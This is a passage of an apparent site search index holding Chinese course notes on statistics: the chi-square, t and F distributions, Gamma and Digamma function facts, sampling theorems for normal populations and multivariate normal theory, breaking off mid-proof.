\u5bf9\u4e8e\u4e00\u822c\u60c5\u5f62\uff0c\u6211\u4eec\u901a\u5e38\u5229\u7528\u6982\u7387\u8bba\u4e2d\u7684\u6781\u9650\u5b9a\u7406\u6c42\u51fa\u7edf\u8ba1\u91cf\u7684\u6781\u9650\u5206\u5e03\uff0c\u8fd9\u79cd\u65b9\u6cd5\u79f0\u4e3a\u5927\u6837\u672c\u7406\u8bba.</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-6-%E7%BB%9F%E8%AE%A1%E9%87%8F%E4%B8%8E%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/#_3","title":"\u6b63\u6001\u603b\u4f53","text":"<p>\u6b63\u6001\u603b\u4f53\u662f\u5b9e\u9645\u603b\u4f53\u7684\u4e00\u4e2a\u8f83\u597d\u7684\u8fd1\u4f3c\uff0c\u6211\u4eec\u7ebf\u4ecb\u7ecd\u4e00\u4e0b\u4e09\u5927\u5206\u5e03\uff1a</p> <p>\\(\\chi^2\\) \u5206\u5e03</p> <p>\u5b9a\u4e49\uff1a\u8bbe \\(X_1, X_2,\\cdots, X_n\\) \u4e3a\u72ec\u7acb\u540c\u5206\u5e03\u7684\u968f\u673a\u53d8\u91cf\u4e14\u5747\u670d\u4ece\u6807\u51c6\u6b63\u6001\u5206\u5e03 \\(N(0,1)\\)\uff0c\u5219\u79f0\u968f\u673a\u53d8\u91cf</p> \\[ \\chi_n^2:=\\sum_{i=1}^{n}X_i^2 \\] <p>\u4e3a\u670d\u4ece\u81ea\u7531\u5ea6\u4e3a \\(n\\) \u7684 \\(\\chi^2\\) \u5206\u5e03\uff0c\u8bb0\u4e3a \\(\\chi_n^2\\sim \\chi^2(n)\\).</p> <p>\\(\\chi^2\\) \u5206\u5e03\u7531\u73b0\u4ee3\u7edf\u8ba1\u5b66\u7684\u5960\u57fa\u4eba\u4e4b\u4e00 Pearson \u63d0\u51fa\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u5982\u4e0b\uff1a</p> \\[ p(x)=\\begin{cases} \\dfrac{\\mathrm{e}^{-\\frac{x}{2}}x^{\\frac{n}{2}-1}}{2^{n/2}\\Gamma(n/2)}, &amp;x&gt;0,\\\\ 0, &amp;x\\le 0. \\end{cases} \\] <ul> <li> <p>Gamma \u51fd\u6570\u8865\u6f0f</p> <p>\u5b9a\u4e49\u5f0f\uff1a</p> \\[ \\Gamma(z)=\\int_{0}^{\\infty}\\mathrm{e}^{-t}t^{z-1}\\mathrm{d}t,\\operatorname{Re}z&gt;0 \\] <p>\u4e00\u4e9b\u6027\u8d28\uff1a</p> <ol> <li>\\(\\Gamma(1)=1\\). proof. \u4ee3\u5165\u7b80\u5355\u8ba1\u7b97\u5373\u53ef.</li> <li>\\(\\Gamma(z+1)=z\\Gamma(z)\\). proof. \u5b9a\u4e49+\u5206\u90e8\u79ef\u5206.</li> <li>\\(\\Gamma(n+1)=n!, n\\in\\mathbb{N}\\). proof. \u76f8\u540c\u9012\u63a8\u5173\u7cfb\uff0c\u5f52\u7eb3\u5373\u53ef.</li> <li>\\(\\Gamma(\\frac{1}{2})=\\sqrt{\\pi}\\). proof. \u6362\u5143\u5e76\u4f7f\u7528\u8457\u540d\u7684\u9ad8\u65af\u79ef\u5206 \\(\\int_{-\\infty}^{+\\infty}\\mathrm{e}^{-x^2}\\mathrm{d}x=\\sqrt{\\pi}\\).</li> <li>Digamma \u51fd\u6570\uff1a\u5b9a\u4e49\uff1a</li> </ol> \\[ \\psi(z):=\\dfrac{\\mathrm{d}(\\ln\\Gamma(z))}{\\mathrm{d}z}=\\dfrac{\\Gamma'(z)}{\\Gamma(z)} \\] <p>\u7279\u6b8a\u503c\uff1a</p> \\[ \\psi(n)=H_{n-1}-\\gamma,n\\in\\mathbb{Z}_+ \\] \\(\\psi(1)=-\\gamma\\) \\(\\psi'(1)=\\dfrac{\\pi^2}{6}\\) \\(\\psi(1/2)=-\\gamma-2\\ln 2\\) \\(\\psi'(1/2)=\\dfrac{\\pi^2}{2}\\) \\(\\psi(-1/2)=-\\gamma-2\\ln 2+2\\) \\(\\psi'(-1/2)=\\dfrac{\\pi^2}{2}+4\\) \\(\\psi(1/4)=-\\gamma-\\dfrac{\\pi}{2}-3\\ln 2\\) \\(\\psi(3/4)-\\gamma+\\dfrac{\\pi}{2}-3\\ln 2\\) \\(\\psi(1/3)=-\\gamma-\\dfrac{\\pi}{2\\sqrt{3}}-\\dfrac{3}{2}\\ln 3\\) \\(\\psi(2/3)=-\\gamma+\\dfrac{\\pi}{2\\sqrt{3}}-\\dfrac{3}{2}\\ln 3\\) <p>\u9012\u63a8\u516c\u5f0f\uff1a</p> \\[     \\psi(z+n)=\\psi(z)+\\sum_{k=0}^{n-1}\\dfrac{1}{z+k},n\\in\\mathbb{N} \\] <p>\u4f59\u5143\u516c\u5f0f\uff1a</p> \\[     \\psi(1-z)-\\psi(z)=\\pi\\cot(\\pi z) \\] <p>\u79ef\u5206\u8868\u793a\uff1a</p> \\[     \\psi(z)=\\int_{0}^{\\infty}\\left(\\dfrac{\\mathrm{e}^{-t}}{t}-\\dfrac{\\mathrm{e}^{-zt}}{1-\\mathrm{e}^{-t}}\\right)\\mathrm{d}t,\\operatorname{Re}z&gt;0 \\] <p>Polygamma \u51fd\u6570\uff1a</p> \\[     \\psi^{(n)}(z)=\\dfrac{\\mathrm{d}^n}{\\mathrm{d}z^n}\\psi(z) \\] <p>\\(n=1\\) \u65f6\u79f0\u4e3a Trigamma \u51fd\u6570.</p> \\[     \\psi^{(m)}(z+n)-\\psi^{(m)}(z)=(-1)^{m}m!\\sum_{k=0}^{n-1}\\dfrac{1}{(k+z)^{m+1}}\\\\     \\psi^{(n)}(1)=\\begin{cases}     -\\gamma,&amp;n=0,\\\\     (-1)^{n+1}n!\\zeta(n+1),&amp;n\\in\\mathbb{Z}_+.     \\end{cases} \\] <ol> <li> <p>Beta \u51fd\u6570/B \u51fd\u6570/\u7b2c\u4e00\u6b27\u62c9\u79ef\u5206</p> <p>\u5b9a\u4e49\uff1a</p> </li> </ol> \\[     B(p,q)=\\int_{0}^{1}t^{p-1}(1-t)^{q-1}\\mathrm{d}t,\\operatorname{Re}p&gt;0,\\operatorname{Re}q&gt;0 \\] <p>\u7b49\u5f0f\uff1a</p> \\[     \\begin{aligned}     B(p,q)&amp;=B(q,p)\\\\     B(p,q)&amp;=\\dfrac{\\Gamma(p)\\Gamma(q)}{\\Gamma(p+q)}\\\\     B(z,1-z)&amp;=\\dfrac{\\pi}{\\sin(\\pi z)}     \\end{aligned} \\] <p>\u65e0\u7a77\u4e58\u79ef\u8868\u793a</p> <p>Euler \u65e0\u7a77\u4e58\u79ef\u8868\u793a</p> \\[     \\Gamma(z)=\\prod_{k=1}^{\\infty}\\left(\\dfrac{k}{z+k-1}\\right)\\left(\\dfrac{k+1}{k}\\right)^{z-1} \\] <p>Weierstrass \u65e0\u7a77\u4e58\u79ef\u8868\u793a</p> \\[ \\Gamma(z)=\\dfrac{1}{z\\mathrm{e}^{z\\gamma}}\\prod_{k=1}^{\\infty}\\dfrac{k}{z+k}\\mathrm{e}^{z/k} \\] </li> </ul> <p>\u6027\u8d28\uff1a</p> <ol> <li>\u82e5 \\(\\chi_1^2\\sim \\chi^2(n_1),\\chi_2^2\\sim \\chi^2(n_2)\\)\uff0c\u4e14\u4e8c\u8005\u76f8\u4e92\u72ec\u7acb\uff0c\u5219\\(\\chi_1^2+\\chi_2^2\\sim\\chi^2(n_1+n_2)\\).</li> <li>\u82e5\\(\\chi^2\\sim \\chi^2(n)\\)\uff0c\u5219 \\(\\mathrm{E}\\chi^2=n,\\mathrm{Var}\\chi^2=2n\\).</li> <li> <p>Cochran \u5206\u89e3\u5b9a\u7406/\u67ef\u8d6b\u4f26\u5206\u89e3\u5b9a\u7406</p> <p>\u8bbe \\(X_1,X_2,\\cdots, X_n\\) \u4e3a\u72ec\u7acb\u540c\u5206\u5e03\u7684\u968f\u673a\u53d8\u91cf\uff0c\u5747\u670d\u4ece \\(N(0,1)\\)\uff0c\u53c8\u8bbe\u79e9\u4e3a \\(n_i\\) \u7684 \\(X_1, X_2,\\cdots, X_n\\) \u7684\u975e\u8d1f\u4e8c\u6b21\u578b \\(Q_i, i=1,2,\\cdots, k\\) \u6ee1\u8db3\uff1a</p> \\[ Q_1+Q_2+\\cdots+Q_k=\\sum_{i=1}^{n}X_i^2 \\] <p>\u5219 \\(Q_i\\) \u76f8\u4e92\u72ec\u7acb\u4e14\u5206\u522b\u670d\u4ece\u81ea\u7531\u5ea6\u4e3a \\(n_i\\) \u7684 \\(\\chi^2\\) \u5206\u5e03\u7684\u5145\u8981\u6761\u4ef6\u4e3a\uff1a</p> \\[ n_1+n_2+\\cdots+n_k=n \\] <p>\u8fd9\u4e2a\u5b9a\u7406\u6709\u77e9\u9635\u7248\u672c.</p> </li> </ol> <p>t \u5206\u5e03</p> <p>\u8bbe \\(X\\sim N(0,1), Y\\sim \\chi^2(n)\\)\uff0c\u4e14 \\(X\\) \u4e0e \\(Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5219\u79f0\u968f\u673a\u53d8\u91cf</p> \\[ T=\\dfrac{X}{\\sqrt{Y/n}} \\] <p>\u670d\u4ece\u81ea\u7531\u5ea6\u4e3a \\(n\\) \u7684 \\(t\\) \u5206\u5e03\uff0c\u8bb0\u4f5c \\(T\\sim t(n)\\).</p> <p>t \u5206\u5e03\u7531\u82f1\u56fd\u7edf\u8ba1\u5b66\u5bb6 W. Gosset \u4ee5\u7b14\u540d Student \u53d1\u8868\uff0c\u6545\u800c\u53c8\u79f0\u4e3a\u5b66\u751f\u5206\u5e03\uff08Student \u5206\u5e03\uff09\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u5982\u4e0b\uff1a</p> \\[ p(x)=\\dfrac{\\Gamma\\left(\\frac{n+1}{2}\\right)}{\\sqrt{n\\pi}\\Gamma\\left(\\frac{n}{2}\\right)}\\left(1+\\dfrac{x^2}{n}\\right)^{-\\frac{n+1}{2}} \\] <p>\u663e\u7136\u8be5\u51fd\u6570\u4e3a\u5076\u51fd\u6570\uff0c\u53ef\u4ee5\u8bc1\u660e\u5f53 \\(n\\to\\infty\\) \u65f6 \\(p(x)\\to \\varphi(x)\\)\uff0c\u6362\u53e5\u8bdd\u8bf4 \\(n\\) \u8db3\u591f\u5927\u65f6 t \u5206\u5e03\u53ef\u8fd1\u4f3c\u4e3a \\(N(0,1)\\).</p> <p>F \u5206\u5e03</p> <p>\u8bbe \\(U\\sim \\chi^2(n_1),V\\sim \\chi^2(n_2)\\)\uff0c\u4e14 \\(U,V\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5219\u79f0\u968f\u673a\u53d8\u91cf\uff1a</p> \\[ F=\\dfrac{U/n_1}{V/n_2} \\] <p>\u670d\u4ece\u81ea\u7531\u5ea6\u4e3a \\((n_1,n_2)\\) \u7684 \\(F\\) \u5206\u5e03\uff0c\u8bb0\u4f5c \\(F\\sim F(n_1, n_2)\\).</p> <p>F \u5206\u5e03\u7531\u73b0\u4ee3\u7edf\u8ba1\u5b66\u7684\u5960\u57fa\u4eba\u4e4b\u4e00 Fisher \u63d0\u51fa\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u5982\u4e0b\uff1a</p> \\[ p(x)=\\dfrac{\\Gamma((n_1+n_2)/2)}{\\Gamma(n_1/2)\\Gamma(n_2/2)}\\left(\\dfrac{n_1}{n_2}\\right)^{\\frac{n_1}{2}}x^{\\frac{n_1}{2}-1}\\left(1+\\dfrac{n_1}{n_2}x\\right)^{-\\frac{n_1+n_2}{2}},x&gt;0 \\] <p>\u53e6 \\(x\\le 0\\) \u65f6 \\(p(x)=0\\). </p> <p>\u4e00\u4e9b\u6027\u8d28\u5982\u4e0b\uff1a</p> <ol> <li>\u82e5 \\(F\\sim F(n_1, n_2)\\)\uff0c\u5219 \\(\\dfrac{1}{F}\\sim F(n_2,n_1)\\).</li> <li>\u82e5 \\(T\\sim t(n)\\)\uff0c\u5219 \\(T^2\\sim F(1, n)\\).</li> </ol> <p>\u4e0a \\(\\alpha\\) \u5206\u4f4d\u70b9</p> <p>\u5b9a\u4e49\uff1a\u8bbe X \u662f\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u7ed9\u5b9a\u7684\u6570 \\(\\alpha(0&lt;\\alpha &lt;1)\\)\uff0c\u6210\u6ee1\u8db3\u4e0b\u8ff0\u6761\u4ef6\u7684\u5b9e\u6570 \\(\\lambda_\\alpha\\) \u4e3a \\(X\\) \u7684\u4e0a \\(\\alpha\\) \u5206\u4f4d\u70b9.</p> \\[ \\mathrm{Pr}(X&gt;\\lambda_\\alpha)=\\alpha \\] <p>\u8bb0\u6cd5\uff1a</p> <p>\u5f53 \\(X\\) \u670d\u4ece \\(N(0,1), \\chi^2(n),t(n),F(n_1,n_2)\\) \u65f6\uff0c\u4e0a \\(\\alpha\\) \u5206\u4f4d\u70b9 \\(\\lambda_\\alpha\\) \u5206\u522b\u8bb0\u4e3a\uff1a\\(u_\\alpha, \\chi_\\alpha^2(n),t_\\alpha(n),F_\\alpha(n_1,n_2)\\).</p> <p>\u4e00\u4e9b\u6027\u8d28\uff1a</p> <ol> <li>\\(u_{1-\\alpha}=-u_\\alpha, t_{1-\\alpha}=-t_\\alpha(n)\\).</li> <li>\\(F_{1-\\alpha}(n_1,n_2)=\\dfrac{1}{F_\\alpha(n_2,n_1)}\\).</li> </ol> <p>\u6b63\u6001\u603b\u4f53\u7684\u6837\u672c\u4e0e\u6837\u672c\u65b9\u5dee\u7684\u5206\u5e03</p> <p>\u5bf9\u4e8e\u6b63\u6001\u603b\u4f53\uff0c\u6837\u672c\u5747\u503c\u4e0e\u6837\u672c\u65b9\u5dee\u53ca\u5176\u76f8\u5173\u7684\u67d0\u4e9b\u7edf\u8ba1\u91cf\u7684\u5206\u5e03\u5177\u6709\u975e\u5e38\u5b8c\u7f8e\u7684\u7ed3\u8bba\uff0c\u8fd9\u4e9b\u7ed3\u8bba\u5bf9\u4e8e\u53c2\u6570\u4f30\u8ba1\u4e0e\u5047\u8bbe\u68c0\u9a8c\u5177\u6709\u91cd\u8981\u7684\u610f\u4e49\uff0c\u7ed3\u679c\u7531\u4e0b\u8ff0\u5b9a\u7406\u7ed9\u51fa\uff1a</p> <p>\u5b9a\u7406\uff1a\u8bbe \\(X_1, X_2,\\cdots, X_n\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu,\\sigma^2)\\) \uff08\u5373\u72ec\u7acb\u540c\u5206\u5e03\u4e3a\u8be5\u5206\u5e03\uff09\u7684\u4e00\u4e2a\u6837\u672c\uff0c\u5219\uff1a</p> <p>(1) \\(\\bar{X}\\sim N(\\mu, \\dfrac{\\sigma^2}{n})\\).</p> <p>(2) \\((n-1)S^2/\\sigma^2\\sim \\chi^2(n-1)\\).</p> <p>(3) \\(\\bar{X}\\) \u4e0e \\(S^2\\) \u76f8\u4e92\u72ec\u7acb.</p> <p>\u63a8\u8bba 1\uff1a\u8bbe \\(X_1, X_2,\\cdots, X_n\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu,\\sigma^2)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\u5219\uff1a</p> \\[ T:=\\dfrac{\\sqrt{n}(\\bar{X}-\\mu)}{S}\\sim t(n-1) \\] <p>\u63a8\u8bba 2\uff1a\u8bbe \\(X_1, X_2,\\cdots, X_{n_1}\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu_1,\\sigma_1^2)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\u8bbe \\(Y_1, Y_2,\\cdots, Y_{n_2}\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu_2,\\sigma_2^2)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\u4e14\u4e24\u6837\u672c\u76f8\u4e92\u72ec\u7acb\uff0c\u8bb0 \\(\\bar{X}\\) \u548c \\(\\bar{Y}\\) \u5206\u522b\u4e3a\u5176\u6837\u672c\u5747\u503c\uff0c\\(S_1^2, S_2^2\\) \u5206\u522b\u4e3a\u5176\u6837\u672c\u65b9\u5dee\uff0c\u5219\uff1a</p> \\[ F:=\\dfrac{S_1^2\\sigma_2^2}{S_2^2\\sigma_1^2}\\sim F(n_1-1,n_2-1) \\] <p>\u63a8\u8bba 3\uff1a\u8bbe \\(X_1, X_2,\\cdots, X_{n_1}\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu_1,\\sigma_1^2)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\u8bbe \\(Y_1, Y_2,\\cdots, Y_{n_2}\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu_2,\\sigma_2^2)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\u4e14\u4e24\u6837\u672c\u76f8\u4e92\u72ec\u7acb\uff0c\u5219\uff1a</p> \\[ T:=\\sqrt{\\dfrac{n_1n_2(n_1+n_2-2)}{n_1+n_2}}\\dfrac{(\\bar{X}-\\bar{Y})-(\\mu_1-\\mu_2)}{\\sqrt{(n_1-1)S_1^2+(n_2-1)S_2^2}}\\sim t(n_1+n_2-2) \\]"},{"location":"in_class_learning/semester_3/probability_theory/Ch-6-%E7%BB%9F%E8%AE%A1%E9%87%8F%E4%B8%8E%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/#_4","title":"\u591a\u5143\u6b63\u6001\u5206\u5e03\u7406\u8bba*","text":"<p>Source: \u56de\u5f52\u5206\u6790|\u7b14\u8bb0\u6574\u7406\uff083\uff09\u2014\u2014\u591a\u5143\u6b63\u6001\u5206\u5e03\u7406\u8bba\uff08\u4e0a\uff09 - \u77e5\u4e4e - \u5b66\u5f31\u6e23\uff1ahttps://zhuanlan.zhihu.com/p/46665398</p> <p>\u524d\u7f6e\u7ebf\u6027\u4ee3\u6570\u5185\u5bb9\uff1a</p> <ol> <li>\u79f0\u65b9\u9635 \\(A\\) \u4e3a\u5e42\u7b49\u9635\u5f53\u4e14\u4ec5\u5f53 \\(A^2=A\\)\uff0c\u5bb9\u6613\u8bc1\u660e\u5176\u7279\u5f81\u503c\u4e3a \\(0\\) \u6216 \\(1\\).</li> <li>\u82e5 \\(A_{n\\times n}\\) \u4e3a\u5bf9\u79f0\u5e42\u7b49\u9635\uff0c\u4e14 \\(\\mathrm{rank}(A)=r\\)\uff0c\u90a3\u4e48\u5b58\u5728\u6b63\u4ea4\u9635 \\(P_{n\\times n}\\)\uff0c\u4f7f\u5f97 \\(A=P\\begin{bmatrix} I_r &amp;0 \\\\ 0 &amp;0\\\\ \\end{bmatrix}P^{\\mathsf{T}}\\). \u6b63\u4ea4\u9635\u5373 \\(PP^{\\mathsf{T}}=I\\) \u7684\u9635.</li> <li>\u82e5 \\(A\\) \u5bf9\u79f0\u5e42\u7b49\uff0c\u5219 \\(\\mathrm{tr}(A)=\\mathrm{rank}(A)\\).</li> <li>\u82e5 \\(A_{n\\times n}\\) \u5bf9\u79f0\u5e42\u7b49\uff0c\u4e14 \\(\\mathrm{rank}(A)=r\\)\uff0c\u5219\u5b58\u5728\u5217\u6ee1\u79e9\u77e9\u9635 \\(B_{n\\times r}\\) \u4f7f\u5f97 \\(A=B(B^{\\mathsf{T}}B)^{-1}B^{\\mathsf{T}}\\).</li> <li>\u6b63\u4ea4\u6295\u5f71\u9635\uff1a\u5bf9\u4efb\u4e00\u5217\u6ee1\u79e9\u77e9\u9635 \\(A\\)\uff0c\u5b9a\u4e49\u6b63\u4ea4\u6295\u5f71\u9635 \\(P_A=A(A^{\\mathsf{T}}A)^{-1}A^{\\mathsf{T}}\\)\uff0c\u4e0d\u96be\u53d1\u73b0\u5176\u5fc5\u4e3a\u4e00\u4e2a\u5bf9\u79f0\u5e42\u7b49\u9635.</li> <li>\\(\\forall x\\in\\mathbb{R}^n\\)\uff0c\u8bbe \\(P\\) \u4e3a \\(n\\) \u9636\u6b63\u4ea4\u6295\u5f71\u9635\uff0c\u90a3\u4e48\u5b58\u5728\u5206\u89e3\u5f0f \\(x=y+z\\) \u4f7f\u5f97 \\(y=Pz, z=(I-P)x\\)\uff0c\u4e14 \\(y^{\\mathsf{T}}z=0\\).</li> </ol> <p>\u5747\u503c\u5411\u91cf\uff1a\u8bbe \\(X=(X_1,X_2\\cdots X_p)^{\\mathsf{T}}\\) \u4e3a \\(p\\) \u7ef4\u968f\u673a\u53d8\u91cf\uff0c\u79f0\u4e0b\u8ff0\u4e3a \\(X\\) \u7684\u5747\u503c\u5411\u91cf\uff1a</p> \\[ \\mathrm{E}X:=(\\mathrm{E}X_1,\\mathrm{E}X_2,\\cdots,\\mathrm{E}X_n)^{\\mathsf{T}} \\] <p>\u534f\u5dee\uff1a\u5b9a\u4e49 \\(\\mathrm{Var}X=\\mathrm{Cov}X=\\mathrm{E}((X-\\mathrm{E}X)(X-\\mathrm{E}X)^{\\mathsf{T}})\\) \u4e3a\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u534f\u5dee\uff0c\u662f\u4e00\u4e2a\u77e9\u9635\uff0c\u663e\u7136\uff1a\\((\\mathrm{Cov}X)[i,j]=\\mathrm{Cov}(X_i,X_j)\\)\uff0c\u5e76\u4e14\u77e9\u9635\u662f\u534a\u6b63\u5b9a\u77e9\u9635.</p> <p>\u8bbe \\(A\\) \u662f\u5e38\u6570\u9635\uff0c\\(X\\) \u662f\u968f\u673a\u53d8\u91cf\uff0c\u5219 \\(\\mathrm{Cov}(AX)=A\\mathrm{Cov}(X)A^{\\mathsf{T}}\\).</p> <p>\u534f\u65b9\u5dee\uff1a\u8bbe \\(X, Y\\)\u5206\u522b\u662f \\(p,q\\) \u7ef4\u5411\u91cf\uff0c\u5b9a\u4e49\u4e8c\u8005\u7684\u534f\u65b9\u5dee\uff1a \\(\\mathrm{Cov}(X,Y)=\\mathrm{E}((X-\\mathrm{E}X)(Y-\\mathrm{E}Y)^{\\mathsf{T}})\\).</p> <p>\u8bbe \\(A,B\\) \u662f\u5e38\u6570\u9635\uff0c\\(X,Y\\) \u662f\u968f\u673a\u53d8\u91cf \\(\\mathrm{Cov} (AX,BY)=A\\mathrm{Cov}(X,Y)B^{\\mathsf{T}}\\).</p> <p>\u4e8c\u6b21\u578b\uff1a\u8bbe \\(X\\) \u4e3a \\(p\\) \u7ef4\u5217\u5411\u91cf\uff0c\\(A\\) \u4e3a \\(p\\times p\\) \u7684\u5bf9\u79f0\u9635\uff0c\u5219\u79f0 \\(X^\\mathsf{T}AX\\) \u4e3a \\(X\\) \u7684\u4e8c\u6b21\u578b\uff0c\u663e\u7136\u5176\u662f\u5173\u4e8e \\(X\\) \u5404\u5206\u91cf\u7684\u4e8c\u6b21\u9879\u4e4b\u548c.</p> <p>\u4e8c\u6b21\u578b\u7684\u5747\u503c\uff1a\u8bbe \\(\\mathrm{E}X=\\mu,\\mathrm{Cov}X=\\Sigma\\)\uff0c\u5219 \\(\\mathrm{E}(X^\\mathsf{T}AX)=\\mu^\\mathsf{T}A\\mu+\\mathrm{tr}(A\\Sigma)\\).</p> <p>\\(p\\) \u5143\u6b63\u6001\u5206\u5e03\uff1a\u8bbe \\(X=(X_1,\\cdots, X_n)\\) \u4e3a \\(p\\) \u7ef4\u968f\u673a\u53d8\u91cf\uff0c\u82e5\u5176\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\u4e3a\uff1a</p> \\[ f(x)=(2\\pi)^{-p/2}|\\Sigma|^{-1/2}\\exp\\left(-\\frac{1}{2}(x-\\mu)^\\mathsf{T}\\Sigma^{-1}(x-\\mu)\\right) \\] <p>\u5176\u4e2d \\(\\mu=(\\mu_1,\\cdots, \\mu_n)^{\\mathsf{T}}\\)\uff0c\\(\\Sigma_{p\\times p}\\) \u6b63\u5b9a\uff0c\u5219\u79f0 \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(\\mu\\) \u548c \\(\\Sigma\\) \u7684 \\(p\\) \u5143\u6b63\u6001\u5206\u5e03\uff0c\u8bb0\u4f5c \\(X\\sim N_p(\\mu,\\Sigma)\\)\uff0c\u663e\u7136\u5176\u5747\u503c\u5411\u91cf\u548c\u534f\u5dee \u4e3a \\(\\mu\\) \u548c \\(\\Sigma\\).</p> <p>\u5f53 \\(\\mu=\\vec{0},\\Sigma=I_p\\) \u65f6\u8f6c\u5316\u4e3a\u591a\u5143\u6807\u51c6\u6b63\u6001\u5206\u5e03\uff0c\\(X\\) \u5404\u5206\u91cf\u4e3a\u72ec\u7acb\u540c\u6807\u51c6\u6b63\u6001\u5206\u5e03.</p> <p>\u6807\u51c6\u5316\u4e0e\u5e73\u65b9\u6839\u9635\uff1a</p> <p>\u5e73\u65b9\u6839\u9635\uff1a\u8bbe \\(\\Sigma=P^{-1}JP\\)\uff0c\u5176\u4e2d \\(J\\) \u662f \\(\\Sigma\\) \u7684 Jordan \u6807\u51c6\u578b\uff0c\u90a3\u4e48\u5b9a\u4e49\u5176\u5e73\u65b9\u6839\u9635\u4e3a\uff1a\\(\\Sigma^{1/2}=P^{-1}J^{1/2}P\\).</p> <p>\u6807\u51c6\u5316\uff1a\\(Y=\\Sigma^{-1/2}(X-\\mu)\\).</p> <p>\u591a\u5143\u6b63\u6001\u5206\u5e03\u7684\u66f4\u4e00\u822c\u5b9a\u4e49\uff1a\u8bbe \\(X\\) \u4e3a \\(p\\) \u7ef4\u968f\u673a\u53d8\u91cf\uff0c\u82e5\u5b58\u5728 \\(p\\times r\\) \u9636\u7684\u5217\u6ee1\u79e9\u77e9\u9635 \\(A\\) \u4f7f\u5f97 \\(X=AY+\\mu\\)\uff0c\u5176\u4e2d \\(Y\\sim N_r(\\vec{0},I_r)\\)\uff0c\u4e14 \\(\\mu\\) \u4e3a\u5e38\u6570\u5411\u91cf\uff0c\u5219\u79f0 \\(X\\sim N_p(\\mu, AA^{\\mathsf{T}})\\).</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-6-%E7%BB%9F%E8%AE%A1%E9%87%8F%E4%B8%8E%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/#_5","title":"\u6b63\u6001\u603b\u4f53\u76f8\u5173\u5b9a\u7406\u7684\u8bc1\u660e*","text":"<p>\u5b9a\u7406\uff1a\u8bbe \\(X_1, X_2,\\cdots, X_n\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu,\\sigma^2)\\) \uff08\u5373\u72ec\u7acb\u540c\u5206\u5e03\u4e3a\u8be5\u5206\u5e03\uff09\u7684\u4e00\u4e2a\u6837\u672c\uff0c\u5219\uff1a</p> <p>(1) \\(\\bar{X}\\sim N(\\mu, \\dfrac{\\sigma^2}{n})\\).</p> <p>(2) \\((n-1)S^2/\\sigma^2\\sim \\chi^2(n-1)\\).</p> <p>(3) \\(\\bar{X}\\) \u4e0e \\(S^2\\) \u76f8\u4e92\u72ec\u7acb.</p> <p>proof.</p> <p>(1) \u56e0 \\(X_1,X_2,\\cdots,X_n\\) \u72ec\u7acb\u540c\u5206\u5e03\u4e8e \\(N(\\mu,\\sigma^2)\\)\uff0c\u6545\u800c </p> \\[ \\bar{X}=\\dfrac{1}{n}\\sum_{i=1}^{n} X_i\\sim N(\\dfrac{1}{n}\\times n\\mu,\\dfrac{1}{n^2}\\times n\\sigma^2) \\] <p>\u4e5f\u5c31\u662f \\(\\bar{X}\\sim N\\left(\\mu,\\dfrac{\\sigma^2}{n}\\right)\\).</p> <p>(2)</p> <p>\u6784\u9020\u5982\u4e0b\u77e9\u9635 \\(A\\)\uff0c\u5e76\u4ee4 \\(\\vec{Y}=A\\vec{X}\\)\uff1a</p> \\[ \\begin{bmatrix} \\mathbf{u}_1\\\\ \\mathbf{u}_2\\\\ \\vdots\\\\ \\mathbf{u}_n \\end{bmatrix}, \\mathbf{u}_1=\\dfrac{1}{\\sqrt{n}}\\mathbf{1}_n, \\mathbf{u}_i=\\dfrac{1}{\\sqrt{i(i-1)}}(\\mathbf{1}_{i-1},-i+1,\\mathbf{0}_{n-i})(i\\ne 1) \\] <p>\u8fd9\u4e2a\u77e9\u9635\u662f\u8fd9\u6837\u6784\u9020\u7684\uff0c\u9996\u5148 \\(\\mathbf{u}_1\\) \u7684\u6784\u9020\u662f\u56e0\u4e3a\u8fd9\u4f7f\u5f97 \\(Y_1=\\mathbf{u}_1\\vec{X}=\\sqrt{n}\\bar{X}\\)\uff0c\u7136\u540e\u4f7f\u7528\u65bd\u5bc6\u7279\u6b63\u4ea4\u5316\u7684\u65b9\u5f0f\u6784\u9020 \\(\\mathbf{u}_i\\).</p> <p>\u9996\u5148\u56e0 \\(A\\) \u7684\u6b63\u4ea4\u6027\uff0c\u6545\uff1a</p> \\[ \\vec{Y}^\\mathsf{T}\\vec{Y}=\\vec{X}^\\mathsf{T}A^\\mathsf{T}A\\vec{X}=\\vec{X}^\\mathsf{T}\\vec{X} \\] <p>\u4e5f\u5c31\u662f \\(\\sum_{i=1}^{n} X_i^2=\\sum_{i=1}^{n}Y_i^2\\).</p> <p>\u6839\u636e \\(\\vec{Y}=A\\vec{X}\\) \u4e0d\u96be\u5f97\u5230 \\(Y_1\\sim N\\left(\\sqrt{n}\\mu,\\sigma^2\\right),Y_i\\sim N(0,\\sigma^2),i\\ne 1\\).</p> <p>\u540c\u65f6\u56e0 \\((X_1,\\cdots,X_n)\\sim N(\\mu\\vec{1}_n,\\sigma^2 I_n)\\)\uff0c\u6545 \\((Y_1,\\cdots, Y_n)\\sim N(\\mu 